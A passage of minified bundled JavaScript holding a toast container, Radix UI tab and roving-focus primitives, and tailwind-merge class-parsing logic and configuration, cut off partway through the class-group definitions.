    Co = 16,
    Gv = ({
        reverseOrder: e,
        position: t = "top-center",
        toastOptions: n,
        gutter: r,
        children: o,
        containerStyle: l,
        containerClassName: i
    }) => {
        let {
            toasts: s,
            handlers: a
        } = Sv(n);
        return x.createElement("div", {
            style: {
                position: "fixed",
                zIndex: 9999,
                top: Co,
                left: Co,
                right: Co,
                bottom: Co,
                pointerEvents: "none",
                ...l
            },
            className: i,
            onMouseEnter: a.startPause,
            onMouseLeave: a.endPause
        }, s.map(u => {
            let d = u.position || t,
                m = a.calculateOffset(u, {
                    reverseOrder: e,
                    gutter: r,
                    defaultPosition: t
                }),
                p = Hv(d, m);
            return x.createElement(Bv, {
                id: u.id,
                key: u.id,
                onHeightUpdate: a.updateHeight,
                className: u.visible ? Kv : "",
                style: p
            }, "custom" === u.type ? wl(u.message, u) : o ? o(u) : x.createElement(Wv, {
                toast: u,
                position: d
            }));
        }));
    },
    tt = Ce;
function at(e, t, {
    checkForDefaultPrevented: n = !0
} = {}) {
    return function (o) {
        if (null == e || e(o), !1 === n || !o.defaultPrevented) return null == t ? void 0 : t(o);
    };
}
function Xr(e, t = []) {
    let n = [];
    const o = () => {
        const l = n.map(i => x.createContext(i));
        return function (s) {
            const a = (null == s ? void 0 : s[e]) || l;
            return x.useMemo(() => ({
                [`__scope${e}`]: {
                    ...s,
                    [e]: a
                }
            }), [s, a]);
        };
    };
    return o.scopeName = e, [function r(l, i) {
        const s = x.createContext(i),
            a = n.length;
        function u(m) {
            const {
                scope: p,
                children: g,
                ...w
            } = m,
                y = (null == p ? void 0 : p[e][a]) || s,
                S = x.useMemo(() => w, Object.values(w));
            return v.jsx(y.Provider, {
                value: S,
                children: g
            });
        }
        return n = [...n, i], u.displayName = l + "Provider", [u, function d(m, p) {
            const g = (null == p ? void 0 : p[e][a]) || s,
                w = x.useContext(g);
            if (w) return w;
            if (void 0 !== i) return i;
            throw new Error(`\`${m}\` must be used within \`${l}\``);
        }];
    }, Qv(o, ...t)];
}
function Qv(...e) {
    const t = e[0];
    if (1 === e.length) return t;
    const n = () => {
        const r = e.map(o => ({
            useScope: o(),
            scopeName: o.scopeName
        }));
        return function (l) {
            const i = r.reduce((s, {
                useScope: a,
                scopeName: u
            }) => ({
                ...s,
                ...a(l)[`__scope${u}`]
            }), {});
            return x.useMemo(() => ({
                [`__scope${t.scopeName}`]: i
            }), [i]);
        };
    };
    return n.scopeName = t.scopeName, n;
}
function Yv(e, t) {
    "function" == typeof e ? e(t) : null != e && (e.current = t);
}
function Ef(...e) {
    return t => e.forEach(n => Yv(n, t));
}
function xl(...e) {
    return x.useCallback(Ef(...e), e);
}
var Dr = x.forwardRef((e, t) => {
    const {
        children: n,
        ...r
    } = e,
        o = x.Children.toArray(n),
        l = o.find(Jv);
    if (l) {
        const i = l.props.children,
            s = o.map(a => a === l ? x.Children.count(i) > 1 ? x.Children.only(null) : x.isValidElement(i) ? i.props.children : null : a);
        return v.jsx(_s, {
            ...r,
            ref: t,
            children: x.isValidElement(i) ? x.cloneElement(i, void 0, s) : null
        });
    }
    return v.jsx(_s, {
        ...r,
        ref: t,
        children: n
    });
});
Dr.displayName = "Slot";
var _s = x.forwardRef((e, t) => {
    const {
        children: n,
        ...r
    } = e;
    if (x.isValidElement(n)) {
        const o = qv(n);
        return x.cloneElement(n, {
            ...Zv(r, n.props),
            ref: t ? Ef(t, o) : o
        });
    }
    return x.Children.count(n) > 1 ? x.Children.only(null) : null;
});
_s.displayName = "SlotClone";
var Xv = ({
    children: e
}) => v.jsx(v.Fragment, {
    children: e
});
function Jv(e) {
    return x.isValidElement(e) && e.type === Xv;
}
function Zv(e, t) {
    const n = {
        ...t
    };
    for (const r in t) {
        const o = e[r],
            l = t[r];
        /^on[A-Z]/.test(r) ? o && l ? n[r] = (...s) => {
            l(...s), o(...s);
        } : o && (n[r] = o) : "style" === r ? n[r] = {
            ...o,
            ...l
        } : "className" === r && (n[r] = [o, l].filter(Boolean).join(" "));
    }
    return {
        ...e,
        ...n
    };
}
function qv(e) {
    var r, o;
    let t = null == (r = Object.getOwnPropertyDescriptor(e.props, "ref")) ? void 0 : r.get,
        n = t && "isReactWarning" in t && t.isReactWarning;
    return n ? e.ref : (t = null == (o = Object.getOwnPropertyDescriptor(e, "ref")) ? void 0 : o.get, n = t && "isReactWarning" in t && t.isReactWarning, n ? e.props.ref : e.props.ref || e.ref);
}
function eg(e) {
    const t = e + "CollectionProvider",
        [n, r] = Xr(t),
        [o, l] = n(t, {
            collectionRef: {
                current: null
            },
            itemMap: new Map()
        }),
        i = g => {
            const {
                scope: w,
                children: y
            } = g,
                S = Je.useRef(null),
                f = Je.useRef(new Map()).current;
            return v.jsx(o, {
                scope: w,
                itemMap: f,
                collectionRef: S,
                children: y
            });
        };
    i.displayName = t;
    const s = e + "CollectionSlot",
        a = Je.forwardRef((g, w) => {
            const {
                scope: y,
                children: S
            } = g,
                c = xl(w, l(s, y).collectionRef);
            return v.jsx(Dr, {
                ref: c,
                children: S
            });
        });
    a.displayName = s;
    const u = e + "CollectionItemSlot",
        d = "data-radix-collection-item",
        m = Je.forwardRef((g, w) => {
            const {
                scope: y,
                children: S,
                ...f
            } = g,
                c = Je.useRef(null),
                h = xl(w, c),
                k = l(u, y);
            return Je.useEffect(() => (k.itemMap.set(c, {
                ref: c,
                ...f
            }), () => {
                k.itemMap.delete(c);
            })), v.jsx(Dr, {
                [d]: "",
                ref: h,
                children: S
            });
        });
    return m.displayName = u, [{
        Provider: i,
        Slot: a,
        ItemSlot: m
    }, function p(g) {
        const w = l(e + "CollectionConsumer", g);
        return Je.useCallback(() => {
            const S = w.collectionRef.current;
            if (!S) return [];
            const f = Array.from(S.querySelectorAll(`[${d}]`));
            return Array.from(w.itemMap.values()).sort((k, C) => f.indexOf(k.ref.current) - f.indexOf(C.ref.current));
        }, [w.collectionRef, w.itemMap]);
    }, r];
}
var Ur = null != globalThis && globalThis.document ? x.useLayoutEffect : () => { },
    tg = Gp.useId || (() => { }),
    ng = 0;
function Nf(e) {
    const [t, n] = x.useState(tg());
    return Ur(() => {
        e || n(r => r !== null && r !== void 0 ? r : String(ng++));
    }, [e]), e || (t ? `radix-${t}` : "");
}
var rg = ["a", "button", "div", "form", "h2", "h3", "img", "input", "label", "li", "nav", "ol", "p", "span", "svg", "ul"],
    Ge = rg.reduce((e, t) => {
        const n = x.forwardRef((r, o) => {
            const {
                asChild: l,
                ...i
            } = r,
                s = l ? Dr : t;
            return typeof window < "u" && (window[Symbol.for("radix-ui")] = !0), v.jsx(s, {
                ...i,
                ref: o
            });
        });
        return n.displayName = `Primitive.${t}`, {
            ...e,
            [t]: n
        };
    }, {});
function Vl(e) {
    const t = x.useRef(e);
    return x.useEffect(() => {
        t.current = e;
    }), x.useMemo(() => (...n) => {
        var r;
        return null == (r = t.current) ? void 0 : r.call(t, ...n);
    }, []);
}
function Pf({
    prop: e,
    defaultProp: t,
    onChange: n = () => { }
}) {
    const [r, o] = og({
        defaultProp: t,
        onChange: n
    }),
        l = void 0 !== e,
        i = l ? e : r,
        s = Vl(n);
    return [i, x.useCallback(u => {
        if (l) {
            const m = "function" == typeof u ? u(e) : u;
            m !== e && s(m);
        } else o(u);
    }, [l, e, o, s])];
}
function og({
    defaultProp: e,
    onChange: t
}) {
    const n = x.useState(e),
        [r] = n,
        o = x.useRef(r),
        l = Vl(t);
    return x.useEffect(() => {
        o.current !== r && (l(r), o.current = r);
    }, [r, o, l]), n;
}
var lg = x.createContext(void 0);
function jf(e) {
    const t = x.useContext(lg);
    return e || t || "ltr";
}
var ki = "rovingFocusGroup.onEntryFocus",
    ig = {
        bubbles: !1,
        cancelable: !0
    },
    Wl = "RovingFocusGroup",
    [Cs, Tf, sg] = eg(Wl),
    [ug, If] = Xr(Wl, [sg]),
    [ag, cg] = ug(Wl),
    zf = x.forwardRef((e, t) => v.jsx(Cs.Provider, {
        scope: e.__scopeRovingFocusGroup,
        children: v.jsx(Cs.Slot, {
            scope: e.__scopeRovingFocusGroup,
            children: v.jsx(dg, {
                ...e,
                ref: t
            })
        })
    }));
zf.displayName = Wl;
var dg = x.forwardRef((e, t) => {
    const {
        __scopeRovingFocusGroup: n,
        orientation: r,
        loop: o = !1,
        dir: l,
        currentTabStopId: i,
        defaultCurrentTabStopId: s,
        onCurrentTabStopIdChange: a,
        onEntryFocus: u,
        preventScrollOnEntryFocus: d = !1,
        ...m
    } = e,
        p = x.useRef(null),
        g = xl(t, p),
        w = jf(l),
        [y = null, S] = Pf({
            prop: i,
            defaultProp: s,
            onChange: a
        }),
        [f, c] = x.useState(!1),
        h = Vl(u),
        k = Tf(n),
        C = x.useRef(!1),
        [T, j] = x.useState(0);
    return x.useEffect(() => {
        const E = p.current;
        if (E) return E.addEventListener(ki, h), () => E.removeEventListener(ki, h);
    }, [h]), v.jsx(ag, {
        scope: n,
        orientation: r,
        dir: w,
        loop: o,
        currentTabStopId: y,
        onItemFocus: x.useCallback(E => S(E), [S]),
        onItemShiftTab: x.useCallback(() => c(!0), []),
        onFocusableItemAdd: x.useCallback(() => j(E => E + 1), []),
        onFocusableItemRemove: x.useCallback(() => j(E => E - 1), []),
        children: v.jsx(Ge.div, {
            tabIndex: f || 0 === T ? -1 : 0,
            "data-orientation": r,
            ...m,
            ref: g,
            style: {
                outline: "none",
                ...e.style
            },
            onMouseDown: at(e.onMouseDown, () => {
                C.current = !0;
            }),
            onFocus: at(e.onFocus, E => {
                const F = !C.current;
                if (E.target === E.currentTarget && F && !f) {
                    const z = new CustomEvent(ki, ig);
                    if (E.currentTarget.dispatchEvent(z), !z.defaultPrevented) {
                        const Z = k().filter(ie => ie.focusable);
                        Mf([Z.find(ie => ie.active), Z.find(ie => ie.id === y), ...Z].filter(Boolean).map(ie => ie.ref.current), d);
                    }
                }
                C.current = !1;
            }),
            onBlur: at(e.onBlur, () => c(!1))
        })
    });
}),
    Rf = "RovingFocusGroupItem",
    Of = x.forwardRef((e, t) => {
        const {
            __scopeRovingFocusGroup: n,
            focusable: r = !0,
            active: o = !1,
            tabStopId: l,
            ...i
        } = e,
            s = Nf(),
            a = l || s,
            u = cg(Rf, n),
            d = u.currentTabStopId === a,
            m = Tf(n),
            {
                onFocusableItemAdd: p,
                onFocusableItemRemove: g
            } = u;
        return x.useEffect(() => {
            if (r) return p(), () => g();
        }, [r, p, g]), v.jsx(Cs.ItemSlot, {
            scope: n,
            id: a,
            focusable: r,
            active: o,
            children: v.jsx(Ge.span, {
                tabIndex: d ? 0 : -1,
                "data-orientation": u.orientation,
                ...i,
                ref: t,
                onMouseDown: at(e.onMouseDown, w => {
                    r ? u.onItemFocus(a) : w.preventDefault();
                }),
                onFocus: at(e.onFocus, () => u.onItemFocus(a)),
                onKeyDown: at(e.onKeyDown, w => {
                    if ("Tab" === w.key && w.shiftKey) return void u.onItemShiftTab();
                    if (w.target !== w.currentTarget) return;
                    const y = mg(w, u.orientation, u.dir);
                    if (void 0 !== y) {
                        if (w.metaKey || w.ctrlKey || w.altKey || w.shiftKey) return;
                        w.preventDefault();
                        let f = m().filter(c => c.focusable).map(c => c.ref.current);
                        if ("last" === y) f.reverse(); else if ("prev" === y || "next" === y) {
                            "prev" === y && f.reverse();
                            const c = f.indexOf(w.currentTarget);
                            f = u.loop ? hg(f, c + 1) : f.slice(c + 1);
                        }
                        setTimeout(() => Mf(f));
                    }
                })
            })
        });
    });
Of.displayName = Rf;
var fg = {
    ArrowLeft: "prev",
    ArrowUp: "prev",
    ArrowRight: "next",
    ArrowDown: "next",
    PageUp: "first",
    Home: "first",
    PageDown: "last",
    End: "last"
};
function pg(e, t) {
    return "rtl" !== t ? e : "ArrowLeft" === e ? "ArrowRight" : "ArrowRight" === e ? "ArrowLeft" : e;
}
function mg(e, t, n) {
    const r = pg(e.key, n);
    if (!("vertical" === t && ["ArrowLeft", "ArrowRight"].includes(r) || "horizontal" === t && ["ArrowUp", "ArrowDown"].includes(r))) return fg[r];
}
function Mf(e, t = !1) {
    const n = document.activeElement;
    for (const r of e) if (r === n || (r.focus({
        preventScroll: t
    }), document.activeElement !== n)) return;
}
function hg(e, t) {
    return e.map((n, r) => e[(t + r) % e.length]);
}
var vg = zf,
    gg = Of;
function yg(e, t) {
    return x.useReducer((n, r) => {
        var _t$n$r;
        return (_t$n$r = t[n][r]) !== null && _t$n$r !== void 0 ? _t$n$r : n;
    }, e);
}
var Lf = e => {
    const {
        present: t,
        children: n
    } = e,
        r = wg(t),
        o = "function" == typeof n ? n({
            present: r.isPresent
        }) : x.Children.only(n),
        l = xl(r.ref, xg(o));
    return "function" == typeof n || r.isPresent ? x.cloneElement(o, {
        ref: l
    }) : null;
};
function wg(e) {
    const [t, n] = x.useState(),
        r = x.useRef({}),
        o = x.useRef(e),
        l = x.useRef("none"),
        i = e ? "mounted" : "unmounted",
        [s, a] = yg(i, {
            mounted: {
                UNMOUNT: "unmounted",
                ANIMATION_OUT: "unmountSuspended"
            },
            unmountSuspended: {
                MOUNT: "mounted",
                ANIMATION_END: "unmounted"
            },
            unmounted: {
                MOUNT: "mounted"
            }
        });
    return x.useEffect(() => {
        const u = Eo(r.current);
        l.current = "mounted" === s ? u : "none";
    }, [s]), Ur(() => {
        const u = r.current,
            d = o.current;
        if (d !== e) {
            const p = l.current,
                g = Eo(u);
            e ? a("MOUNT") : "none" === g || "none" === (null == u ? void 0 : u.display) ? a("UNMOUNT") : a(d && p !== g ? "ANIMATION_OUT" : "UNMOUNT"), o.current = e;
        }
    }, [e, a]), Ur(() => {
        if (t) {
            const u = m => {
                const g = Eo(r.current).includes(m.animationName);
                m.target === t && g && Sf.flushSync(() => a("ANIMATION_END"));
            },
                d = m => {
                    m.target === t && (l.current = Eo(r.current));
                };
            return t.addEventListener("animationstart", d), t.addEventListener("animationcancel", u), t.addEventListener("animationend", u), () => {
                t.removeEventListener("animationstart", d), t.removeEventListener("animationcancel", u), t.removeEventListener("animationend", u);
            };
        }
        a("ANIMATION_END");
    }, [t, a]), {
        isPresent: ["mounted", "unmountSuspended"].includes(s),
        ref: x.useCallback(u => {
            u && (r.current = getComputedStyle(u)), n(u);
        }, [])
    };
}
function Eo(e) {
    return (null == e ? void 0 : e.animationName) || "none";
}
function xg(e) {
    var r, o;
    let t = null == (r = Object.getOwnPropertyDescriptor(e.props, "ref")) ? void 0 : r.get,
        n = t && "isReactWarning" in t && t.isReactWarning;
    return n ? e.ref : (t = null == (o = Object.getOwnPropertyDescriptor(e, "ref")) ? void 0 : o.get, n = t && "isReactWarning" in t && t.isReactWarning, n ? e.props.ref : e.props.ref || e.ref);
}
Lf.displayName = "Presence";
var Pu = "Tabs",
    [Sg, L0] = Xr(Pu, [If]),
    Af = If(),
    [kg, ju] = Sg(Pu),
    $f = x.forwardRef((e, t) => {
        const {
            __scopeTabs: n,
            value: r,
            onValueChange: o,
            defaultValue: l,
            orientation: i = "horizontal",
            dir: s,
            activationMode: a = "automatic",
            ...u
        } = e,
            d = jf(s),
            [m, p] = Pf({
                prop: r,
                onChange: o,
                defaultProp: l
            });
        return v.jsx(kg, {
            scope: n,
            baseId: Nf(),
            value: m,
            onValueChange: p,
            orientation: i,
            dir: d,
            activationMode: a,
            children: v.jsx(Ge.div, {
                dir: d,
                "data-orientation": i,
                ...u,
                ref: t
            })
        });
    });
$f.displayName = Pu;
var Ff = "TabsList",
    Df = x.forwardRef((e, t) => {
        const {
            __scopeTabs: n,
            loop: r = !0,
            ...o
        } = e,
            l = ju(Ff, n),
            i = Af(n);
        return v.jsx(vg, {
            asChild: !0,
            ...i,
            orientation: l.orientation,
            dir: l.dir,
            loop: r,
            children: v.jsx(Ge.div, {
                role: "tablist",
                "aria-orientation": l.orientation,
                ...o,
                ref: t
            })
        });
    });
Df.displayName = Ff;
var Uf = "TabsTrigger",
    bf = x.forwardRef((e, t) => {
        const {
            __scopeTabs: n,
            value: r,
            disabled: o = !1,
            ...l
        } = e,
            i = ju(Uf, n),
            s = Af(n),
            a = Bf(i.baseId, r),
            u = Hf(i.baseId, r),
            d = r === i.value;
        return v.jsx(gg, {
            asChild: !0,
            ...s,
            focusable: !o,
            active: d,
            children: v.jsx(Ge.button, {
                type: "button",
                role: "tab",
                "aria-selected": d,
                "aria-controls": u,
                "data-state": d ? "active" : "inactive",
                "data-disabled": o ? "" : void 0,
                disabled: o,
                id: a,
                ...l,
                ref: t,
                onMouseDown: at(e.onMouseDown, m => {
                    o || 0 !== m.button || !1 !== m.ctrlKey ? m.preventDefault() : i.onValueChange(r);
                }),
                onKeyDown: at(e.onKeyDown, m => {
                    [" ", "Enter"].includes(m.key) && i.onValueChange(r);
                }),
                onFocus: at(e.onFocus, () => {
                    const m = "manual" !== i.activationMode;
                    !d && !o && m && i.onValueChange(r);
                })
            })
        });
    });
bf.displayName = Uf;
var Vf = "TabsContent",
    Wf = x.forwardRef((e, t) => {
        const {
            __scopeTabs: n,
            value: r,
            forceMount: o,
            children: l,
            ...i
        } = e,
            s = ju(Vf, n),
            a = Bf(s.baseId, r),
            u = Hf(s.baseId, r),
            d = r === s.value,
            m = x.useRef(d);
        return x.useEffect(() => {
            const p = requestAnimationFrame(() => m.current = !1);
            return () => cancelAnimationFrame(p);
        }, []), v.jsx(Lf, {
            present: o || d,
            children: ({
                present: p
            }) => v.jsx(Ge.div, {
                "data-state": d ? "active" : "inactive",
                "data-orientation": s.orientation,
                role: "tabpanel",
                "aria-labelledby": a,
                hidden: !p,
                id: u,
                tabIndex: 0,
                ...i,
                ref: t,
                style: {
                    ...e.style,
                    animationDuration: m.current ? "0s" : void 0
                },
                children: p && l
            })
        });
    });
function Bf(e, t) {
    return `${e}-trigger-${t}`;
}
function Hf(e, t) {
    return `${e}-content-${t}`;
}
Wf.displayName = Vf;
var _g = $f,
    Kf = Df,
    Gf = bf,
    Qf = Wf;
function Yf(e) {
    var t,
        n,
        r = "";
    if ("string" == typeof e || "number" == typeof e) r += e; else if ("object" == typeof e) if (Array.isArray(e)) {
        var o = e.length;
        for (t = 0; t < o; t++) e[t] && (n = Yf(e[t])) && (r && (r += " "), r += n);
    } else for (n in e) e[n] && (r && (r += " "), r += n);
    return r;
}
function Cg() {
    for (var e, t, n = 0, r = "", o = arguments.length; n < o; n++) (e = arguments[n]) && (t = Yf(e)) && (r && (r += " "), r += t);
    return r;
}
const Tu = "-";
function Eg(e) {
    const t = Pg(e),
        {
            conflictingClassGroups: n,
            conflictingClassGroupModifiers: r
        } = e;
    return {
        getClassGroupId: function o(i) {
            const s = i.split(Tu);
            return "" === s[0] && 1 !== s.length && s.shift(), Xf(s, t) || Ng(i);
        },
        getConflictingClassGroupIds: function l(i, s) {
            const a = n[i] || [];
            return s && r[i] ? [...a, ...r[i]] : a;
        }
    };
}
function Xf(e, t) {
    var i;
    if (0 === e.length) return t.classGroupId;
    const n = e[0],
        r = t.nextPart.get(n),
        o = r ? Xf(e.slice(1), r) : void 0;
    if (o) return o;
    if (0 === t.validators.length) return;
    const l = e.join(Tu);
    return null == (i = t.validators.find(({
        validator: s
    }) => s(l))) ? void 0 : i.classGroupId;
}
const Ga = /^\[(.+)\]$/;
function Ng(e) {
    if (Ga.test(e)) {
        const t = Ga.exec(e)[1],
            n = null == t ? void 0 : t.substring(0, t.indexOf(":"));
        if (n) return "arbitrary.." + n;
    }
}
function Pg(e) {
    const {
        theme: t,
        prefix: n
    } = e,
        r = {
            nextPart: new Map(),
            validators: []
        };
    return Tg(Object.entries(e.classGroups), n).forEach(([l, i]) => {
        Es(i, r, l, t);
    }), r;
}
function Es(e, t, n, r) {
    e.forEach(o => {
        if ("string" != typeof o) {
            if ("function" == typeof o) return jg(o) ? void Es(o(r), t, n, r) : void t.validators.push({
                validator: o,
                classGroupId: n
            });
            Object.entries(o).forEach(([l, i]) => {
                Es(i, Qa(t, l), n, r);
            });
        } else {
            ("" === o ? t : Qa(t, o)).classGroupId = n;
        }
    });
}
function Qa(e, t) {
    let n = e;
    return t.split(Tu).forEach(r => {
        n.nextPart.has(r) || n.nextPart.set(r, {
            nextPart: new Map(),
            validators: []
        }), n = n.nextPart.get(r);
    }), n;
}
function jg(e) {
    return e.isThemeGetter;
}
function Tg(e, t) {
    return t ? e.map(([n, r]) => [n, r.map(l => "string" == typeof l ? t + l : "object" == typeof l ? Object.fromEntries(Object.entries(l).map(([i, s]) => [t + i, s])) : l)]) : e;
}
function Ig(e) {
    if (e < 1) return {
        get: () => { },
        set: () => { }
    };
    let t = 0,
        n = new Map(),
        r = new Map();
    function o(l, i) {
        n.set(l, i), t++, t > e && (t = 0, r = n, n = new Map());
    }
    return {
        get(l) {
            let i = n.get(l);
            return void 0 !== i ? i : void 0 !== (i = r.get(l)) ? (o(l, i), i) : void 0;
        },
        set(l, i) {
            n.has(l) ? n.set(l, i) : o(l, i);
        }
    };
}
const Jf = "!";
function zg(e) {
    const {
        separator: t,
        experimentalParseClassName: n
    } = e,
        r = 1 === t.length,
        o = t[0],
        l = t.length;
    function i(s) {
        const a = [];
        let m,
            u = 0,
            d = 0;
        for (let S = 0; S < s.length; S++) {
            let f = s[S];
            if (0 === u) {
                if (f === o && (r || s.slice(S, S + l) === t)) {
                    a.push(s.slice(d, S)), d = S + l;
                    continue;
                }
                if ("/" === f) {
                    m = S;
                    continue;
                }
            }
            "[" === f ? u++ : "]" === f && u--;
        }
        const p = 0 === a.length ? s : s.substring(d),
            g = p.startsWith(Jf);
        return {
            modifiers: a,
            hasImportantModifier: g,
            baseClassName: g ? p.substring(1) : p,
            maybePostfixModifierPosition: m && m > d ? m - d : void 0
        };
    }
    return n ? function (a) {
        return n({
            className: a,
            parseClassName: i
        });
    } : i;
}
function Rg(e) {
    if (e.length <= 1) return e;
    const t = [];
    let n = [];
    return e.forEach(r => {
        "[" === r[0] ? (t.push(...n.sort(), r), n = []) : n.push(r);
    }), t.push(...n.sort()), t;
}
function Og(e) {
    return {
        cache: Ig(e.cacheSize),
        parseClassName: zg(e),
        ...Eg(e)
    };
}
const Mg = /\s+/;
function Lg(e, t) {
    const {
        parseClassName: n,
        getClassGroupId: r,
        getConflictingClassGroupIds: o
    } = t,
        l = new Set();
    return e.trim().split(Mg).map(i => {
        const {
            modifiers: s,
            hasImportantModifier: a,
            baseClassName: u,
            maybePostfixModifierPosition: d
        } = n(i);
        let m = !!d,
            p = r(m ? u.substring(0, d) : u);
        if (!p) {
            if (!m) return {
                isTailwindClass: !1,
                originalClassName: i
            };
            if (p = r(u), !p) return {
                isTailwindClass: !1,
                originalClassName: i
            };
            m = !1;
        }
        const g = Rg(s).join(":");
        return {
            isTailwindClass: !0,
            modifierId: a ? g + Jf : g,
            classGroupId: p,
            originalClassName: i,
            hasPostfixModifier: m
        };
    }).reverse().filter(i => {
        if (!i.isTailwindClass) return !0;
        const {
            modifierId: s,
            classGroupId: a,
            hasPostfixModifier: u
        } = i,
            d = s + a;
        return !l.has(d) && (l.add(d), o(a, u).forEach(m => l.add(s + m)), !0);
    }).reverse().map(i => i.originalClassName).join(" ");
}
function Ag() {
    let t,
        n,
        e = 0,
        r = "";
    for (; e < arguments.length;) (t = arguments[e++]) && (n = Zf(t)) && (r && (r += " "), r += n);
    return r;
}
function Zf(e) {
    if ("string" == typeof e) return e;
    let t,
        n = "";
    for (let r = 0; r < e.length; r++) e[r] && (t = Zf(e[r])) && (n && (n += " "), n += t);
    return n;
}
function $g(e, ...t) {
    let n,
        r,
        o,
        l = function i(a) {
            const u = t.reduce((d, m) => m(d), e());
            return n = Og(u), r = n.cache.get, o = n.cache.set, l = s, s(a);
        };
    function s(a) {
        const u = r(a);
        if (u) return u;
        const d = Lg(a, n);
        return o(a, d), d;
    }
    return function () {
        return l(Ag.apply(null, arguments));
    };
}
function b(e) {
    const t = n => n[e] || [];
    return t.isThemeGetter = !0, t;
}
const qf = /^\[(?:([a-z-]+):)?(.+)\]$/i,
    Fg = /^\d+\/\d+$/,
    Dg = new Set(["px", "full", "screen"]),
    Ug = /^(\d+(\.\d+)?)?(xs|sm|md|lg|xl)$/,
    bg = /\d+(%|px|r?em|[sdl]?v([hwib]|min|max)|pt|pc|in|cm|mm|cap|ch|ex|r?lh|cq(w|h|i|b|min|max))|\b(calc|min|max|clamp)\(.+\)|^0$/,
    Vg = /^(rgba?|hsla?|hwb|(ok)?(lab|lch))\(.+\)$/,
    Wg = /^(inset_)?-?((\d+)?\.?(\d+)[a-z]+|0)_-?((\d+)?\.?(\d+)[a-z]+|0)/,
    Bg = /^(url|image|image-set|cross-fade|element|(repeating-)?(linear|radial|conic)-gradient)\(.+\)$/;
function rt(e) {
    return Yt(e) || Dg.has(e) || Fg.test(e);
}
function yt(e) {
    return Hn(e, "length", Zg);
}
function Yt(e) {
    return !!e && !Number.isNaN(Number(e));
}
function No(e) {
    return Hn(e, "number", Yt);
}
function sr(e) {
    return !!e && Number.isInteger(Number(e));
}
function Hg(e) {
    return e.endsWith("%") && Yt(e.slice(0, -1));
}
function O(e) {
    return qf.test(e);
}
function wt(e) {
    return Ug.test(e);
}
const Kg = new Set(["length", "size", "percentage"]);
function Gg(e) {
    return Hn(e, Kg, ep);
}
function Qg(e) {
    return Hn(e, "position", ep);
}
const Yg = new Set(["image", "url"]);
function Xg(e) {
    return Hn(e, Yg, ey);
}
function Jg(e) {
    return Hn(e, "", qg);
}
function ur() {
    return !0;
}
function Hn(e, t, n) {
    const r = qf.exec(e);
    return !!r && (r[1] ? "string" == typeof t ? r[1] === t : t.has(r[1]) : n(r[2]));
}
function Zg(e) {
    return bg.test(e) && !Vg.test(e);
}
function ep() {
    return !1;
}
function qg(e) {
    return Wg.test(e);
}
function ey(e) {
    return Bg.test(e);
}
function ty() {
    const e = b("colors"),
        t = b("spacing"),
        n = b("blur"),
        r = b("brightness"),
        o = b("borderColor"),
        l = b("borderRadius"),
        i = b("borderSpacing"),
        s = b("borderWidth"),
        a = b("contrast"),
        u = b("grayscale"),
        d = b("hueRotate"),
        m = b("invert"),
        p = b("gap"),
        g = b("gradientColorStops"),
        w = b("gradientColorStopPositions"),
        y = b("inset"),
        S = b("margin"),
        f = b("opacity"),
        c = b("padding"),
        h = b("saturate"),
        k = b("scale"),
        C = b("sepia"),
        T = b("skew"),
        j = b("space"),
        E = b("translate"),
        Z = () => ["auto", O, t],
        A = () => [O, t],
        Qe = () => ["", rt, yt],
        vt = () => ["auto", Yt, O],
        I = () => ["", "0", O],
        D = () => [Yt, No],
        H = () => [Yt, O];
    return {
        cacheSize: 500,
        separator: ":",
        theme: {
            colors: [ur],
            spacing: [rt, yt],
            blur: ["none", "", wt, O],
            brightness: D(),
            borderColor: [e],
            borderRadius: ["none", "", "full", wt, O],
            borderSpacing: A(),
            borderWidth: Qe(),
            contrast: D(),
            grayscale: I(),
            hueRotate: H(),
            invert: I(),
            gap: A(),
            gradientColorStops: [e],
            gradientColorStopPositions: [Hg, yt],
            inset: Z(),
            margin: Z(),
            opacity: D(),
            padding: A(),
            saturate: D(),
            scale: D(),
            sepia: I(),
            skew: H(),
            space: A(),
            translate: A()
        },
        classGroups: {
            aspect: [{
                aspect: ["auto", "square", "video", O]
            }],
            container: ["container"],
            columns: [{
                columns: [wt]
            }],
            "break-after": [{
                "break-after": ["auto", "avoid", "all", "avoid-page", "page", "left", "right", "column"]
            }],
            "break-before": [{
                "break-before": ["auto", "avoid", "all", "avoid-page", "page", "left", "right", "column"]
            }],
            "break-inside": [{
                "break-inside": ["auto", "avoid", "avoid-page", "avoid-column"]
            }],
            "box-decoration": [{
                "box-decoration": ["slice", "clone"]
            }],
            box: [{
                box: ["border", "content"]
            }],
            display: ["block", "inline-block", "inline", "flex", "inline-flex", "table", "inline-table", "table-caption", "table-cell", "table-column", "table-column-group", "table-footer-group", "table-header-group", "table-row-group", "table-row", "flow-root", "grid", "inline-grid", "contents", "list-item", "hidden"],
            float: [{
                float: ["right", "left", "none", "start", "end"]
            }],
            clear: [{
                clear: ["left", "right", "both", "none", "start", "end"]
            }],
            isolation: ["isolate", "isolation-auto"],
            "object-fit": [{
                object: ["contain", "cover", "fill", "none", "scale-down"]
            }],
            "object-position": [{
                object: ["bottom", "center", "left", "left-bottom", "left-top", "right", "right-bottom", "right-top", "top", O]
            }],
            overflow: [{
                overflow: ["auto", "hidden", "clip", "visible", "scroll"]
            }],
            "overflow-x": [{
                "overflow-x": ["auto", "hidden", "clip", "visible", "scroll"]
            }],
            "overflow-y": [{
                "overflow-y": ["auto", "hidden", "clip", "visible", "scroll"]
            }],
            overscroll: [{
                overscroll: ["auto", "contain", "none"]
            }],
            "overscroll-x": [{
                "overscroll-x": ["auto", "contain", "none"]
            }],
            "overscroll-y": [{
                "overscroll-y": ["auto", "contain", "none"]
            }],
            position: ["static", "fixed", "absolute", "relative", "sticky"],
            inset: [{
                inset: [y]
            }],
            "inset-x": [{
                "inset-x": [y]
            }],
            "inset-y": [{
                "inset-y": [y]
            }],
            start: [{
                start: [y]
            }],
            end: [{
                end: [y]
            }],
            top: [{
                top: [y]
            }],
            right: [{
                right: [y]
            }],
            bottom: [{
                bottom: [y]
            }],
            left: [{
                left: [y]
            }],
            visibility: ["visible", "invisible", "collapse"],
            z: [{
                z: ["auto", sr, O]
            }],
            basis: [{
                basis: Z()
            }],
            "flex-direction": [{
                flex: ["row", "row-reverse", "col", "col-reverse"]
            }],
            "flex-wrap": [{
                flex: ["wrap", "wrap-reverse", "nowrap"]
            }],
            flex: [{
                flex: ["1", "auto", "initial", "none", O]
            }],
            grow: [{
                grow: I()
            }],
            shrink: [{
                shrink: I()
            }],
            order: [{
                order: ["first", "last", "none", sr, O]
            }],
            "grid-cols": [{
                "grid-cols": [ur]
            }],
            "col-start-end": [{
                col: ["auto", {
                    span: ["full", sr, O]
                }, O]
            }],
